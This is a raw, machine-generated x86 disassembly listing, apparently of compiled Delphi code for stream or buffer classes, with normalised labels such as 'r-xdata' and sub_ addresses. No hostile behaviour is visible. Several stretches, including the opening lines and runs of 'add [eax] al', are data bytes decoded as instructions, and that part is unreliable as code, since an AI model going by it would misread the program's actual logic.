aas
inc eax
add [ edi + edi + 0x40 ] dl
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jne r-xdata
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
enter 0x0 0x0
imul edi [ edx + 0x65 ] 0x8bd88b53
sbb [ eax + eax - 0x3f7b0000 ] 0x74
add eax 0x52ff108b
cmp dh al
sub [ eax + eax + 0x5b000000 ] 0xffffffc3
nop
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
sbb al [ ebp + 0x49 ]
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
sbb [ edi ] bh
push esp
dec esp
inc ebp
js r-xdata
inc ebp
jb r-xdata
inc ebp
jb r-xdata
inc ebp
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jb r-xdata
outsd
sub_4776e8
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x6c ]
lea edx [ esi + 0xbc ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x98 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0xc8 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47460c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_477748
push ebx
mov ebx eax
mov [ ebx + 0xac ] 0x0
mov [ ebx + 0x89 ] 0x0
lea edx [ ebx + 0xbc ]
mov eax [ r-xdata ]
call sub_462560
mov dl 0x1
mov eax [ r-xdata ]
call sub_475fc0
mov [ ebx + 0xbc ] eax
lea edx [ ebx + 0x98 ]
mov eax [ r-xdata ]
call sub_462560
push ebx
push sub_47787c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4759a4
mov [ ebx + 0x98 ] eax
mov [ ebx + 0xac ] 0x1
pop ebx
retn
sub_4777ac
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41dd8c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x9c ]
jne r-xdata
xor eax eax
mov [ edi + 0x9c ] eax
sub_477810
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_416824
inc eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ rw-data ] eax
pop ebx
retn
mov edx ebx
mov eax [ rw-data ]
call sub_416668
sub_477890
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc8 ]
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_475fc0
mov [ ebx + 0xc8 ] eax
call sub_475974
jmp r-xdata
mov [ ebx + 0xcc ] esi
pop esi
pop ebx
retn
sub_4778c4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477902
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478ed0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477909
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0xc8 ]
mov eax [ r-xdata ]
call sub_462560
retn
sub_47790c
push ebp
mov ebp esp
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_477966
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0xc8 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47796d
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
cmp [ eax + 0x20 ] 0x0
jle r-xdata
push 0x1
push 0xffffffff
lea ecx [ ebp - 0x4 ]
xchg edx ecx
call sub_475a94
lea edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_4779a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4779f3
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4779fa
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_4646f0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_477a00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_477a49
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46478c
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477a50
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_477a58
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_477ab6
push [ fs : eax ]
mov [ fs : eax ] esp
test cl cl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_464808
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477abd
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov esi eax
sub_477ac4
push ebp
mov ebp esp
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_477b2a
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4647c4
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477b31
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
sub_477b38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477bfa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_478edc
xor eax eax
push ebp
push sub_477bdd
push [ fs : eax ]
mov [ fs : eax ] esp
test bl bl
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx 0x1
jno r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov cl 0x1
mov eax [ ebp - 0x4 ]
call sub_477a58
test ebx ebx
jl r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477be4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb8 ]
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x88 ]
inc esi
dec ebx
jne r-xdata
sub_477c08
push ebp
mov ebp esp
push 0x0
push ebx
xor edx edx
push ebp
push sub_477c56
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0xa0 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464974
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c5d
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
sub_477c64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
xor edx edx
push ebp
push sub_477cc9
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xa0 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_464988
mov esi eax
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477cd0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov esi eax
sub_477cd8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_477d4f
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx 0x8
mov esi [ eax ]
call [ esi + 0xa0 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46499c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477d56
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
sub_477d64
push ebx
push esi
mov esi edx
mov ebx eax
push 0xffffffff
push esi
or ecx 0xffffffff
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
pop esi
pop ebx
retn
sub_477d87
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_477fba
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov [ ebp + 0xc ] eax
mov [ ebx + 0xb4 ] 0x0
mov [ ebx + 0xb5 ] 0x0
or esi 0xffffffff
xor eax eax
mov [ ebp - 0xc ] eax
call sub_463ca0
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404edc
cmp [ ebp + 0xc ] 0x0
jle r-xdata
cmp edi [ ebp - 0xc ]
jle r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp esi [ ebp + 0xc ]
jle r-xdata
or esi 0xffffffff
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_475db8
mov esi eax
jmp r-xdata
cmp esi 0xffffffff
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x14 ]
cmp [ ebx + 0xa4 ] 0x0
sete dl
mov eax [ r-xdata ]
call sub_46328c
mov [ ebx + 0xb4 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebx + 0x98 ]
call sub_475a24
jmp r-xdata
mov [ ebp - 0xc ] edi
mov eax [ ebx + 0x98 ]
mov edi [ eax + 0x20 ]
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_405120
mov edx eax
add edx esi
jno r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x64 ]
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x58 ]
inc eax
sete al
mov [ ebx + 0xb5 ] al
cmp [ ebx + 0xb5 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477fc1
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebx + 0x98 ]
call sub_475a24
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405270
jne r-xdata
call sub_403e34
cmp [ ebx + 0xb5 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x18 ]
cmp [ ebx + 0xa4 ] 0x0
sete dl
mov eax [ r-xdata ]
call sub_46328c
mov [ ebx + 0xb4 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebx + 0x98 ]
call sub_475a24
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx esi
call sub_4055ac
test esi esi
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_404e44
jmp r-xdata
call sub_463ca0
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_463cf0
cmp eax [ ebp - 0x8 ]
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
dec esi
test eax eax
je r-xdata
mov [ ebx + 0xb5 ] 0x1
call sub_403e2c
cmp esi [ eax - 0x4 ]
jb r-xdata
inc esi
cmp [ eax + esi - 0x1 ] 0xd
jne r-xdata
sub esi 0x1
jno r-xdata
call sub_403e34
sub_477fcf
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_47804f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_405120
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478056
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
cmp esi [ ebp - 0x4 ]
jl r-xdata
add esi 0x1
jno r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_477d64
mov edx [ ebp - 0x8 ]
mov ecx ebx
mov eax [ r-xdata ]
call sub_4626c4
call sub_403e34
sub_478060
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_478298
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jge r-xdata
cmp [ ebp + 0x8 ] 0x0
jae r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax esi
call sub_4192c0
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov edi eax
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax edi
cdq
push edx
push eax
mov eax esi
call sub_4192e0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax edi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
jmp r-xdata
call sub_403e2c
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
push 0x0
push 0x0
mov eax esi
call sub_4192e0
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
jmp r-xdata
xor ecx ecx
mov eax [ r-xdata ]
call sub_46328c
test bl bl
je r-xdata
mov dl 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor eax eax
push ebp
push sub_47826d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov cl 0x1
mov eax [ ebp - 0x8 ]
call sub_477a58
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_477ac4
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x8 ] 0x0
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc4 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc4 ]
cdq
push edx
push eax
call sub_46462c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478274
mov dl 0x1
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
jmp r-xdata
mov edi eax
push edi
push 0x0
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ r-xdata ]
call sub_463544
mov edi eax
test edi edi
jne r-xdata
call sub_403e2c
push edi
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax edi
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
sub_4782a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
test esi esi
jle r-xdata
inc esi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x0
mov ecx [ ebx + 0xb8 ]
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x58 ]
mov cl 0x1
mov dl 0x1
mov eax ebx
mov esi [ eax ]
call [ esi + 0x64 ]
movzx eax [ ebp + 0x8 ]
push eax
push 0xffffffff
mov edx [ ebp - 0x4 ]
or ecx 0xffffffff
mov eax [ ebx + 0x98 ]
call sub_475a94
mov eax [ ebx + 0x98 ]
cmp esi [ eax + 0x20 ]
jg r-xdata
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x58 ]
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x64 ]
movzx eax [ ebp + 0x8 ]
push eax
push 0xffffffff
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ ebx + 0x98 ]
call sub_475a94
jmp r-xdata
sub_478338
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478383
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_405170
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47838a
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_478393
inc [ edx ]
add [ eax ] al
add [ 0x3300000a ] cl
rol bl 0x90
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x94 ]
mov edx esi
call sub_404e98
pop esi
pop ebx
retn
sub_4783c0
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x64 ]
cmp [ ebx + 0x89 ] 0x0
jne r-xdata
mov eax ebx
call sub_478cd4
test al al
jne r-xdata
cmp [ ebx + 0x98 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_478400
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov eax ebx
call sub_4192c0
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_419344
mov eax ebx
call sub_4192c0
cmp edx [ ebp - 0x4 ]
jne r-xdata
je r-xdata
cmp eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax ebx
call sub_4192e0
sub_478448
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xd ] cl
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_478758
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
call sub_4192c0
add eax [ ebp + 0x8 ]
adc edx [ ebp + 0xc ]
jno r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x1c ] 0x7fffffff
push 0x0
push 0x0
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_478400
call sub_403e34
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_477c64
cdq
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_477cd8
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x60 ]
test al al
je r-xdata
mov eax ebx
cdq
push edx
push eax
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_46462c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
xor eax eax
push ebp
push sub_478735
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x98 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47873c
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_4192c0
cmp edx [ esp + 0x4 ]
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov [ ebp - 0x14 ] eax
push 0xffffffff
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x98 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_475b88
mov eax [ ebp - 0x14 ]
cdq
sub [ ebp - 0x20 ] eax
sbb [ ebp - 0x1c ] edx
jmp r-xdata
call sub_403e2c
pop edx
pop eax
jge r-xdata
cmp eax [ esp ]
pop edx
pop eax
jae r-xdata
jg r-xdata
cmp [ ebp - 0x20 ] 0x0
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ ebp - 0xc ]
call sub_4192c0
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_419344
jmp r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc0 ]
cdq
push edx
push eax
call sub_46462c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4786ae
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4785fe
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
push 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xa0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_403e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
retn
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_463610
mov eax [ ebp - 0x14 ]
cdq
sub [ ebp - 0x20 ] eax
sbb [ ebp - 0x1c ] edx
sub_478603
add [ eax ] eax
add [ eax ] al
les eax [ edx - 0x79f0ffc0 ]
inc edi
add [ ecx - 0x13ba743d ] cl
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x98 ]
mov eax [ eax + 0x20 ]
cdq
push edx
push eax
call sub_46462c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov [ ebp - 0x14 ] eax
push 0x1
push 0xffffffff
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x98 ]
mov ecx [ ebp - 0x14 ]
call sub_475a94
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
and al [ ebp - 0xd ]
je r-xdata
call sub_403e2c
call sub_404800
call sub_404854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
call sub_404854
call sub_404884
jmp r-xdata
retn
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_463610
mov eax [ ebp - 0x14 ]
cdq
sub [ ebp - 0x20 ] eax
sbb [ ebp - 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47873c
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_4192c0
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jge r-xdata
cmp eax [ esp ]
pop edx
pop eax
jae r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406410
retn
mov eax [ ebp - 0xc ]
call sub_4192c0
push edx
push eax
mov eax [ ebp - 0xc ]
call sub_419344
jmp r-xdata
sub_478768
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4787b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
